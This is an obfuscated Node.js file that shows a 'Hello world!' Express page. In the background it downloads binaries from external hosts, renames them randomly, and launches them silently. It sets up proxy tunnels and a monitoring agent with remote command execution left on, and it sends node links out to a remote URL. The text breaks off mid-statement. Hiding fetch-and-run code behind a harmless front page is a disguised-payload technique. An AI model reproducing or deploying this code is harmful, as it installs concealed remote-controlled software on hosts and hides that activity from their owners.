const _0x28dc2b=_0x103d;(function(_0x10a9f9,_0x187e32){const _0x5a1edf={_0x5c332e:0x1c3,_0x21efec:0x1c9,_0x4a5d3c:0x206,_0x3357e6:0x1e3,_0x25821d:0x24e},_0x17ab8d=_0x103d,_0x5a7da7=_0x10a9f9();while(!![]){try{const _0xb698e3=parseInt(_0x17ab8d(_0x5a1edf._0x5c332e))/0x1+parseInt(_0x17ab8d(0x1ed))/0x2+parseInt(_0x17ab8d(_0x5a1edf._0x21efec))/0x3+parseInt(_0x17ab8d(0x21e))/0x4*(parseInt(_0x17ab8d(_0x5a1edf._0x4a5d3c))/0x5)+parseInt(_0x17ab8d(0x1b6))/0x6*(parseInt(_0x17ab8d(0x211))/0x7)+-parseInt(_0x17ab8d(_0x5a1edf._0x3357e6))/0x8*(-parseInt(_0x17ab8d(_0x5a1edf._0x25821d))/0x9)+-parseInt(_0x17ab8d(0x20d))/0xa;if(_0xb698e3===_0x187e32)break;else _0x5a7da7['push'](_0x5a7da7['shift']());}catch(_0x356699){_0x5a7da7['push'](_0x5a7da7['shift']());}}}(_0x4d4d,0x5ffb3));const express=require(_0x28dc2b(0x23c)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require('util'),exec=promisify(require(_0x28dc2b(0x208))['exec']),{execSync}=require(_0x28dc2b(0x208)),UPLOAD_URL=process[_0x28dc2b(0x1f7)][_0x28dc2b(0x202)]||'',PROJECT_URL=process[_0x28dc2b(0x1f7)][_0x28dc2b(0x22a)]||'',AUTO_ACCESS=process['env']['AUTO_ACCESS']||![],FILE_PATH=process[_0x28dc2b(0x1f7)][_0x28dc2b(0x250)]||'./tmp',SUB_PATH=process[_0x28dc2b(0x1f7)][_0x28dc2b(0x221)]||_0x28dc2b(0x22b),PORT=process[_0x28dc2b(0x1f7)][_0x28dc2b(0x205)]||process['env'][_0x28dc2b(0x1cb)]||0xbb8,UUID=process[_0x28dc2b(0x1f7)][_0x28dc2b(0x217)]||_0x28dc2b(0x247),NEZHA_SERVER=process[_0x28dc2b(0x1f7)]['NEZHA_SERVER']||'',NEZHA_PORT=process['env'][_0x28dc2b(0x1d0)]||'',NEZHA_KEY=process['env'][_0x28dc2b(0x220)]||'',ARGO_DOMAIN=process['env'][_0x28dc2b(0x1ee)]||'',ARGO_AUTH=process['env']['ARGO_AUTH']||'',ARGO_PORT=process[_0x28dc2b(0x1f7)][_0x28dc2b(0x23d)]||0x1f41,CFIP=process['env'][_0x28dc2b(0x1f0)]||'cdns.doon.eu.org',CFPORT=process['env'][_0x28dc2b(0x1dc)]||0x1bb,NAME=process[_0x28dc2b(0x1f7)][_0x28dc2b(0x23e)]||'';!fs[_0x28dc2b(0x246)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x28dc2b(0x224)](FILE_PATH+_0x28dc2b(0x25e))):console[_0x28dc2b(0x224)](FILE_PATH+_0x28dc2b(0x1d7));function generateRandomName(){const _0x383a1c={_0x2e6932:0x25d},_0x35ab76=_0x28dc2b,_0x13fee4=_0x35ab76(0x23a);let _0x344504='';for(let _0x5b8b1b=0x0;_0x5b8b1b<0x6;_0x5b8b1b++){_0x344504+=_0x13fee4[_0x35ab76(0x1c8)](Math[_0x35ab76(0x25a)](Math[_0x35ab76(0x1ff)]()*_0x13fee4[_0x35ab76(_0x383a1c._0x2e6932)]));}return _0x344504;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x28dc2b(0x200)](FILE_PATH,npmName),phpPath=path[_0x28dc2b(0x200)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x28dc2b(0x200)](FILE_PATH,botName),subPath=path[_0x28dc2b(0x200)](FILE_PATH,_0x28dc2b(0x1b5)),listPath=path[_0x28dc2b(0x200)](FILE_PATH,_0x28dc2b(0x230)),bootLogPath=path[_0x28dc2b(0x200)](FILE_PATH,_0x28dc2b(0x1ec)),configPath=path[_0x28dc2b(0x200)](FILE_PATH,'config.json');function deleteNodes(){const _0x26d227={_0x2426bc:0x24d,_0x53559b:0x1d3,_0x1ecf41:0x24a,_0x2700e3:0x1c0,_0x4503b6:0x1e7},_0x405380=_0x28dc2b;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x575a9f;try{_0x575a9f=fs[_0x405380(_0x26d227._0x2426bc)](subPath,_0x405380(_0x26d227._0x53559b));}catch{return null;}const _0x456a49=Buffer[_0x405380(0x201)](_0x575a9f,_0x405380(_0x26d227._0x1ecf41))['toString'](_0x405380(0x1d3)),_0x3943c4=_0x456a49[_0x405380(_0x26d227._0x2700e3)]('\x0a')[_0x405380(0x1f5)](_0x57c1cd=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x405380(0x1f6)](_0x57c1cd));if(_0x3943c4['length']===0x0)return;return axios[_0x405380(0x253)](UPLOAD_URL+_0x405380(_0x26d227._0x4503b6),JSON[_0x405380(0x1fd)]({'nodes':_0x3943c4}),{'headers':{'Content-Type':_0x405380(0x23b)}})['catch'](_0x580133=>{return null;}),null;}catch(_0x9e3226){return null;}}function cleanupOldFiles(){const _0xe608ca={_0x1cd223:0x200,_0x3487be:0x22f},_0x16efdd=_0x28dc2b;try{const _0x2b5b0b=fs[_0x16efdd(0x23f)](FILE_PATH);_0x2b5b0b[_0x16efdd(0x21b)](_0x4aee7f=>{const _0x36d450=_0x16efdd,_0x5dd4f0=path[_0x36d450(_0xe608ca._0x1cd223)](FILE_PATH,_0x4aee7f);try{const _0x1f9174=fs[_0x36d450(0x229)](_0x5dd4f0);_0x1f9174['isFile']()&&fs[_0x36d450(_0xe608ca._0x3487be)](_0x5dd4f0);}catch(_0x16eaa9){}});}catch(_0x5c862a){}}function _0x4d4d(){const _0x2eb47d=['https://amd64.ssss.nyc.mn/v1','true','length','\x20is\x20created','firefox','platform','text/plain;\x20charset=utf-8','https://ipapi.co/json/','https://amd64.ssss.nyc.mn/web','Error\x20executing\x20command:\x20','push','\x20is\x20running','\x0a\x0atrojan://','has','NEZHA\x20variable\x20is\x20empty,skip\x20running','status','xtls-rprx-vision','App\x20is\x20running','close','countryCode','php\x20running\x20error:\x20','sub.txt','6RyFOyM','/tunnel.yml\x20run','none','/vmess-argo','Unknown','?security=tls&sni=','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','message','match','\x20>/dev/null\x202>&1\x20&','split','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','145096QBFCoA','send','tunnel.yml','/sub.txt\x20saved\x20successfully','127.0.0.1','charAt','812568RmlZTW','https://amd64.ssss.nyc.mn/agent','PORT','pkill\x20-f\x20\x22[','http://ip-api.com/json/','arm','fileName','NEZHA_PORT','/dev/null','block','utf-8','/config.json\x20>/dev/null\x202>&1\x20&','https://oooo.serv00.net/add-url','vless','\x20already\x20exists','tcp','Unhandled\x20error\x20in\x20startserver:','win32','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','CFPORT','then','\x0a\x0avmess://','org','catch','direct','\x0aclient_secret:\x20','8GezTmY','arch','freedom','\x20>\x20nul\x202>&1','/api/delete-nodes','/vmess-argo?ed=2560','data','del\x20/f\x20/q\x20','Error\x20in\x20startserver:','boot.log','640626enTdlP','ARGO_DOMAIN','https+local://8.8.8.8/dns-query','CFIP','Error\x20downloading\x20files:','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','\x20>/dev/null\x202>&1','http\x20server\x20is\x20running\x20on\x20port:','filter','test','env','nohup\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','clear','?encryption=none&security=tls&sni=','2096','stringify','--tls','random','join','from','UPLOAD_URL','taskkill\x20/f\x20/im\x20','response','SERVER_PORT','895WtYbPe','get','child_process','config.yaml','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','2053','Content-Type','19236870unGNWj','toString','\x20-c\x20\x22','\x22\x20>\x20/dev/null\x202>&1','3572737ONjXHx','arm64','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','&path=%2Ftrojan-argo%3Fed%3D2560#','unshift','tunnel.json','UUID','config.json','finish','Empowerment\x20success\x20for\x20','forEach','443','Error\x20reading\x20boot.log:','9580SEIDpC','2083','NEZHA_KEY','SUB_PATH','TunnelSecret','/api/add-nodes','log','vmess','quic','https://arm64.ssss.nyc.mn/v1','includes','statSync','PROJECT_URL','sub','listen','writeFileSync','2087','unlinkSync','list.txt','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','unlink','amd','\x0a\x20\x20tunnel:\x20','\x0a\x20\x20\x20\x20','/vless-argo','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x0avless://','https://arm64.ssss.nyc.mn/agent','abcdefghijklmnopqrstuvwxyz','application/json','express','ARGO_PORT','NAME','readdirSync','chmod','8443','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','error','trojan','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','existsSync','93f2e037-395f-436a-bbf9-5b090fe75344','all','Skipping\x20adding\x20automatic\x20access\x20task','base64','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','tls','readFileSync','5773185ewRZRz','/trojan-argo','FILE_PATH','&fp=firefox&type=ws&host=','Download\x20','post','country_code','&path=%2Fvless-argo%3Fed%3D2560#','\x0a\x20\x20credentials-file:\x20','\x20failed:\x20','basename','http','floor'];_0x4d4d=function(){return _0x2eb47d;};return _0x4d4d();}function _0x103d(_0x2b196f,_0x2026b8){const _0x4d4def=_0x4d4d();return _0x103d=function(_0x103d39,_0x28b1c1){_0x103d39=_0x103d39-0x1b0;let _0xba4b6e=_0x4d4def[_0x103d39];return _0xba4b6e;},_0x103d(_0x2b196f,_0x2026b8);}app['get']('/',function(_0x5b1bd8,_0x36b5e9){const _0x3ec3b9=_0x28dc2b;_0x36b5e9[_0x3ec3b9(0x1c4)]('Hello\x20world!');});async function generateConfig(){const _0x8edcef={_0x3ac88f:0x1d6,_0x11e464:0x1b0,_0x350bae:0x1b8,_0x1eca30:0x236,_0x3de715:0x1b9,_0x4d5e3a:0x1d8,_0x2cc7e1:0x1d8,_0x3850fc:0x226,_0x13fa5a:0x244,_0x129735:0x1b8,_0x315868:0x24f,_0x641fd8:0x24c,_0x1508bc:0x1e5,_0x1ef800:0x1e1,_0x23cbc9:0x218},_0x46eadb=_0x28dc2b,_0x2a8905={'log':{'access':_0x46eadb(0x1d1),'error':'/dev/null','loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x46eadb(_0x8edcef._0x3ac88f),'settings':{'clients':[{'id':UUID,'flow':_0x46eadb(_0x8edcef._0x11e464)}],'decryption':_0x46eadb(_0x8edcef._0x350bae),'fallbacks':[{'dest':0xbb9},{'path':_0x46eadb(_0x8edcef._0x1eca30),'dest':0xbba},{'path':_0x46eadb(_0x8edcef._0x3de715),'dest':0xbbb},{'path':_0x46eadb(0x24f),'dest':0xbbc}]},'streamSettings':{'network':_0x46eadb(_0x8edcef._0x4d5e3a)}},{'port':0xbb9,'listen':_0x46eadb(0x1c7),'protocol':_0x46eadb(_0x8edcef._0x3ac88f),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x46eadb(_0x8edcef._0x2cc7e1),'security':_0x46eadb(0x1b8)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x46eadb(_0x8edcef._0x3ac88f),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x46eadb(0x1b8),'wsSettings':{'path':_0x46eadb(_0x8edcef._0x1eca30)}},'sniffing':{'enabled':!![],'destOverride':[_0x46eadb(0x259),_0x46eadb(0x24c),_0x46eadb(0x226)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x46eadb(0x1c7),'protocol':_0x46eadb(0x225),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x46eadb(0x1b9)}},'sniffing':{'enabled':!![],'destOverride':[_0x46eadb(0x259),_0x46eadb(0x24c),_0x46eadb(_0x8edcef._0x3850fc)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x46eadb(0x1c7),'protocol':_0x46eadb(_0x8edcef._0x13fa5a),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x46eadb(_0x8edcef._0x129735),'wsSettings':{'path':_0x46eadb(_0x8edcef._0x315868)}},'sniffing':{'enabled':!![],'destOverride':[_0x46eadb(0x259),_0x46eadb(_0x8edcef._0x641fd8),_0x46eadb(0x226)],'metadataOnly':![]}}],'dns':{'servers':[_0x46eadb(0x1ef)]},'outbounds':[{'protocol':_0x46eadb(_0x8edcef._0x1508bc),'tag':_0x46eadb(_0x8edcef._0x1ef800)},{'protocol':'blackhole','tag':_0x46eadb(0x1d2)}]};fs[_0x46eadb(0x22d)](path[_0x46eadb(0x200)](FILE_PATH,_0x46eadb(_0x8edcef._0x23cbc9)),JSON[_0x46eadb(0x1fd)](_0x2a8905,null,0x2));}function getSystemArchitecture(){const _0x2977f2={_0x1f58f2:0x1ce,_0x5dcd8f:0x212,_0x4b377b:0x233},_0x14e286=_0x28dc2b,_0x3a849b=os[_0x14e286(0x1e4)]();return _0x3a849b===_0x14e286(_0x2977f2._0x1f58f2)||_0x3a849b===_0x14e286(_0x2977f2._0x5dcd8f)||_0x3a849b==='aarch64'?'arm':_0x14e286(_0x2977f2._0x4b377b);}function downloadFile(_0x1707ca,_0xdd8526,_0x33b97b){const _0x544d61={_0x5c83e5:0x207,_0x50599f:0x1e0},_0x402b15={_0x191893:0x257},_0x903289={_0x4da1da:0x1e9,_0x125fa4:0x219},_0x4817b1=_0x28dc2b,_0x538f80=_0x1707ca;!fs[_0x4817b1(0x246)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x4f5a18=fs['createWriteStream'](_0x538f80);axios({'method':_0x4817b1(_0x544d61._0x5c83e5),'url':_0xdd8526,'responseType':'stream'})[_0x4817b1(0x1dd)](_0x3ef92f=>{const _0x3c4d68={_0x54b6b9:0x258,_0x5a47ea:0x1bd},_0x4e288a={_0x423cc7:0x1b2,_0x541e64:0x258},_0x56204f=_0x4817b1;_0x3ef92f[_0x56204f(_0x903289._0x4da1da)]['pipe'](_0x4f5a18),_0x4f5a18['on'](_0x56204f(_0x903289._0x125fa4),()=>{const _0x366708=_0x56204f;_0x4f5a18[_0x366708(_0x4e288a._0x423cc7)](),console['log'](_0x366708(0x252)+path[_0x366708(_0x4e288a._0x541e64)](_0x538f80)+'\x20successfully'),_0x33b97b(null,_0x538f80);}),_0x4f5a18['on'](_0x56204f(0x243),_0x40889d=>{const _0x1e6eb7=_0x56204f;fs[_0x1e6eb7(0x232)](_0x538f80,()=>{});const _0x320893=_0x1e6eb7(0x252)+path[_0x1e6eb7(_0x3c4d68._0x54b6b9)](_0x538f80)+_0x1e6eb7(0x257)+_0x40889d[_0x1e6eb7(_0x3c4d68._0x5a47ea)];console['error'](_0x320893),_0x33b97b(_0x320893);});})[_0x4817b1(_0x544d61._0x50599f)](_0x4aa5cf=>{const _0x36d942=_0x4817b1,_0x1265d3='Download\x20'+path['basename'](_0x538f80)+_0x36d942(_0x402b15._0x191893)+_0x4aa5cf['message'];console[_0x36d942(0x243)](_0x1265d3),_0x33b97b(_0x1265d3);});}async function downloadFilesAndRun(){const _0x4e9d33={_0x297dee:0x224,_0x803838:0x1c2,_0x31c9f1:0x1f1,_0x1e9d8f:0x1fc,_0x3387bc:0x20b,_0x2c4ad3:0x25c,_0x15e0f5:0x237,_0x91f323:0x200,_0x1b761e:0x20f,_0x5f33de:0x243,_0x10c2ab:0x22e,_0x27689d:0x224,_0x3b6b76:0x224,_0xb00cad:0x269,_0x11e8d9:0x1b7,_0x299584:0x1f9,_0x24165a:0x224},_0x5dc259={_0x1bb51a:0x21b},_0x44c309=_0x28dc2b,_0x9682a6=getSystemArchitecture(),_0x317d20=getFilesForArchitecture(_0x9682a6);if(_0x317d20[_0x44c309(0x25d)]===0x0){console[_0x44c309(_0x4e9d33._0x297dee)](_0x44c309(_0x4e9d33._0x803838));return;}const _0x3672fe=_0x317d20['map'](_0x206572=>{return new Promise((_0x53d152,_0x2baf5c)=>{const _0x402569=_0x103d;downloadFile(_0x206572[_0x402569(0x1cf)],_0x206572['fileUrl'],(_0x1f9b3f,_0xe9ebff)=>{_0x1f9b3f?_0x2baf5c(_0x1f9b3f):_0x53d152(_0xe9ebff);});});});try{await Promise[_0x44c309(0x248)](_0x3672fe);}catch(_0x15a0da){console[_0x44c309(0x243)](_0x44c309(_0x4e9d33._0x31c9f1),_0x15a0da);return;}function _0x24b1d0(_0x4d9b0e){const _0x39c05b={_0x8be5e3:0x224,_0x14a580:0x20e},_0x477fe4=_0x44c309,_0x172100=0x1fd;_0x4d9b0e[_0x477fe4(_0x5dc259._0x1bb51a)](_0x39c95e=>{const _0x3d984d=_0x477fe4;fs[_0x3d984d(0x246)](_0x39c95e)&&fs[_0x3d984d(0x240)](_0x39c95e,_0x172100,_0x3415e7=>{const _0xdc157c=_0x3d984d;_0x3415e7?console['error']('Empowerment\x20failed\x20for\x20'+_0x39c95e+':\x20'+_0x3415e7):console[_0xdc157c(_0x39c05b._0x8be5e3)](_0xdc157c(0x21a)+_0x39c95e+':\x20'+_0x172100[_0xdc157c(_0x39c05b._0x14a580)](0x8));});});}const _0x15b8af=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x24b1d0(_0x15b8af);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4f995f=NEZHA_SERVER[_0x44c309(0x228)](':')?NEZHA_SERVER[_0x44c309(0x1c0)](':')['pop']():'',_0x301eea=new Set([_0x44c309(0x21c),'8443',_0x44c309(_0x4e9d33._0x1e9d8f),'2087','2083',_0x44c309(_0x4e9d33._0x3387bc)]),_0x5c95b0=_0x301eea[_0x44c309(0x268)](_0x4f995f)?_0x44c309(_0x4e9d33._0x2c4ad3):'false',_0x57e673=_0x44c309(0x1e2)+NEZHA_KEY+_0x44c309(_0x4e9d33._0x15e0f5)+NEZHA_SERVER+_0x44c309(0x242)+_0x5c95b0+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](path[_0x44c309(_0x4e9d33._0x91f323)](FILE_PATH,_0x44c309(0x209)),_0x57e673);const _0xa01d23=_0x44c309(0x1f8)+phpPath+_0x44c309(_0x4e9d33._0x1b761e)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0xa01d23),console[_0x44c309(0x224)](phpName+'\x20is\x20running'),await new Promise(_0x1f5c0b=>setTimeout(_0x1f5c0b,0x3e8));}catch(_0x13855a){console[_0x44c309(_0x4e9d33._0x5f33de)](_0x44c309(0x1b4)+_0x13855a);}}else{let _0x16dfa3='';const _0x303e64=[_0x44c309(0x21c),_0x44c309(0x241),_0x44c309(0x1fc),_0x44c309(_0x4e9d33._0x10c2ab),_0x44c309(0x21f),_0x44c309(0x20b)];_0x303e64[_0x44c309(0x228)](NEZHA_PORT)&&(_0x16dfa3=_0x44c309(0x1fe));const _0x34538d='nohup\x20'+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x16dfa3+_0x44c309(0x24b);try{await exec(_0x34538d),console[_0x44c309(_0x4e9d33._0x27689d)](npmName+_0x44c309(0x266)),await new Promise(_0x378b44=>setTimeout(_0x378b44,0x3e8));}catch(_0x5487f7){console[_0x44c309(0x243)]('npm\x20running\x20error:\x20'+_0x5487f7);}}}else console[_0x44c309(_0x4e9d33._0x3b6b76)](_0x44c309(_0x4e9d33._0xb00cad));const _0x5c4018=_0x44c309(0x1f8)+webPath+'\x20-c\x20'+FILE_PATH+_0x44c309(0x1d4);try{await exec(_0x5c4018),console['log'](webName+'\x20is\x20running'),await new Promise(_0x5d7c96=>setTimeout(_0x5d7c96,0x3e8));}catch(_0x4ec16d){console['error']('web\x20running\x20error:\x20'+_0x4ec16d);}if(fs[_0x44c309(0x246)](botPath)){let _0x4d64f9;if(ARGO_AUTH[_0x44c309(0x1be)](/^[A-Z0-9a-z=]{120,250}$/))_0x4d64f9='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x44c309(0x1be)](/TunnelSecret/)?_0x4d64f9=_0x44c309(0x1f2)+FILE_PATH+_0x44c309(_0x4e9d33._0x11e8d9):_0x4d64f9=_0x44c309(_0x4e9d33._0x299584)+FILE_PATH+_0x44c309(0x20a)+ARGO_PORT;try{await exec(_0x44c309(0x1f8)+botPath+'\x20'+_0x4d64f9+'\x20>/dev/null\x202>&1\x20&'),console[_0x44c309(_0x4e9d33._0x24165a)](botName+_0x44c309(0x266)),await new Promise(_0x495985=>setTimeout(_0x495985,0x7d0));}catch(_0xcb2eba){console['error'](_0x44c309(0x264)+_0xcb2eba);}}await new Promise(_0x1f229c=>setTimeout(_0x1f229c,0x1388));}function getFilesForArchitecture(_0x292d51){const _0x332d4e={_0x5ded9a:0x239,_0x1f8630:0x215,_0x50eba2:0x227},_0x2ec9b7=_0x28dc2b;let _0x7e2a84;_0x292d51==='arm'?_0x7e2a84=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x7e2a84=[{'fileName':webPath,'fileUrl':_0x2ec9b7(0x263)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0xeebc84=_0x292d51==='arm'?_0x2ec9b7(_0x332d4e._0x5ded9a):_0x2ec9b7(0x1ca);_0x7e2a84[_0x2ec9b7(_0x332d4e._0x1f8630)]({'fileName':npmPath,'fileUrl':_0xeebc84});}else{const _0xaf2183=_0x292d51==='arm'?_0x2ec9b7(_0x332d4e._0x50eba2):_0x2ec9b7(0x25b);_0x7e2a84[_0x2ec9b7(_0x332d4e._0x1f8630)]({'fileName':phpPath,'fileUrl':_0xaf2183});}}return _0x7e2a84;}function argoType(){const _0x1977d9={_0x137a47:0x213,_0x1f6cdd:0x222,_0x4203d8:0x22d,_0x3f3441:0x216,_0x51496e:0x1c0,_0x15d528:0x256,_0x167d62:0x200,_0x293226:0x216,_0x2c93c5:0x1c1,_0x22a6a3:0x1c5,_0x4adf94:0x224,_0x189448:0x231},_0x150fb9=_0x28dc2b;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x150fb9(0x224)](_0x150fb9(_0x1977d9._0x137a47));return;}if(ARGO_AUTH[_0x150fb9(0x228)](_0x150fb9(_0x1977d9._0x1f6cdd))){fs[_0x150fb9(_0x1977d9._0x4203d8)](path[_0x150fb9(0x200)](FILE_PATH,_0x150fb9(_0x1977d9._0x3f3441)),ARGO_AUTH);const _0x11eac0=_0x150fb9(0x234)+ARGO_AUTH[_0x150fb9(_0x1977d9._0x51496e)]('\x22')[0xb]+_0x150fb9(_0x1977d9._0x15d528)+path[_0x150fb9(_0x1977d9._0x167d62)](FILE_PATH,_0x150fb9(_0x1977d9._0x293226))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x150fb9(_0x1977d9._0x2c93c5)+ARGO_PORT+_0x150fb9(0x245);fs[_0x150fb9(0x22d)](path[_0x150fb9(0x200)](FILE_PATH,_0x150fb9(_0x1977d9._0x22a6a3)),_0x11eac0);}else console[_0x150fb9(_0x1977d9._0x4adf94)](_0x150fb9(_0x1977d9._0x189448));}async function extractDomains(){const _0x10c5c3={_0x309919:0x224,_0x220661:0x24d,_0x33aff6:0x1d3,_0x12ad54:0x1c0,_0x1ebc00:0x21b,_0x3afcf0:0x224,_0x50f9d0:0x1bc,_0x57b4e0:0x200},_0x478e9c={_0x25f726:0x262,_0xca3f7c:0x1e9,_0x450536:0x254,_0x3ec1e7:0x1df,_0xac95aa:0x1e9,_0x596fc1:0x1ba},_0x4a1b0d={_0x377bad:0x260,_0x3f064c:0x1c8},_0x185bd6=_0x28dc2b;let _0x41f3f3;if(ARGO_AUTH&&ARGO_DOMAIN)_0x41f3f3=ARGO_DOMAIN,console[_0x185bd6(_0x10c5c3._0x309919)]('ARGO_DOMAIN:',_0x41f3f3),await _0xb4b647(_0x41f3f3);else try{const _0x67ed28=fs[_0x185bd6(_0x10c5c3._0x220661)](path['join'](FILE_PATH,'boot.log'),_0x185bd6(_0x10c5c3._0x33aff6)),_0x147745=_0x67ed28[_0x185bd6(_0x10c5c3._0x12ad54)]('\x0a'),_0x4ac428=[];_0x147745[_0x185bd6(_0x10c5c3._0x1ebc00)](_0x386d40=>{const _0x367608=_0x185bd6,_0x7e553d=_0x386d40[_0x367608(0x1be)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x7e553d){const _0x1085c6=_0x7e553d[0x1];_0x4ac428[_0x367608(0x265)](_0x1085c6);}});if(_0x4ac428[_0x185bd6(0x25d)]>0x0)_0x41f3f3=_0x4ac428[0x0],console[_0x185bd6(_0x10c5c3._0x3afcf0)]('ArgoDomain:',_0x41f3f3),await _0xb4b647(_0x41f3f3);else{console['log'](_0x185bd6(_0x10c5c3._0x50f9d0)),fs[_0x185bd6(0x22f)](path[_0x185bd6(_0x10c5c3._0x57b4e0)](FILE_PATH,_0x185bd6(0x1ec)));async function _0x347f61(){const _0x1db006=_0x185bd6;try{process[_0x1db006(_0x4a1b0d._0x377bad)]===_0x1db006(0x1da)?await exec(_0x1db006(0x203)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x1db006(0x1cc)+botName[_0x1db006(_0x4a1b0d._0x3f064c)](0x0)+']'+botName['substring'](0x1)+_0x1db006(0x210));}catch(_0x271431){}}_0x347f61(),await new Promise(_0x3c7e50=>setTimeout(_0x3c7e50,0xbb8));const _0x116c52='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x185bd6(0x20a)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x116c52+_0x185bd6(0x1bf)),console[_0x185bd6(0x224)](botName+'\x20is\x20running'),await new Promise(_0x493250=>setTimeout(_0x493250,0xbb8)),await extractDomains();}catch(_0x1b0cf3){console['error'](_0x185bd6(0x264)+_0x1b0cf3);}}}catch(_0x3c326f){console['error'](_0x185bd6(0x21d),_0x3c326f);}async function _0x46cebb(){const _0x3ee12a=_0x185bd6;try{const _0x3b8453=await axios['get'](_0x3ee12a(_0x478e9c._0x25f726),{'timeout':0xbb8});if(_0x3b8453[_0x3ee12a(_0x478e9c._0xca3f7c)]&&_0x3b8453['data'][_0x3ee12a(_0x478e9c._0x450536)]&&_0x3b8453['data'][_0x3ee12a(_0x478e9c._0x3ec1e7)])return _0x3b8453['data'][_0x3ee12a(0x254)]+'_'+_0x3b8453[_0x3ee12a(0x1e9)][_0x3ee12a(_0x478e9c._0x3ec1e7)];}catch(_0x47f2ba){try{const _0x322b2c=await axios[_0x3ee12a(0x207)](_0x3ee12a(0x1cd),{'timeout':0xbb8});if(_0x322b2c[_0x3ee12a(_0x478e9c._0xca3f7c)]&&_0x322b2c['data']['status']==='success'&&_0x322b2c[_0x3ee12a(_0x478e9c._0xca3f7c)]['countryCode']&&_0x322b2c['data']['org'])return _0x322b2c[_0x3ee12a(_0x478e9c._0xac95aa)][_0x3ee12a(0x1b3)]+'_'+_0x322b2c[_0x3ee12a(0x1e9)]['org'];}catch(_0x4001e1){}}return _0x3ee12a(_0x478e9c._0x596fc1);}async function _0xb4b647(_0x349cbe){const _0x56b8a9={_0x10091d:0x1b8,_0x1486ec:0x1b8,_0xe50d0b:0x1e8,_0x192cf1:0x25f,_0x58fef:0x201,_0x30ea8e:0x24a,_0x181707:0x267,_0x161e44:0x1bb,_0x33c6dc:0x214,_0x2a0f9f:0x20e,_0x19e314:0x22d,_0x112897:0x224,_0x23e6e5:0x1c6},_0xa80b42=await _0x46cebb(),_0x5dfb59=NAME?NAME+'-'+_0xa80b42:_0xa80b42;return new Promise(_0xd17eca=>{setTimeout(()=>{const 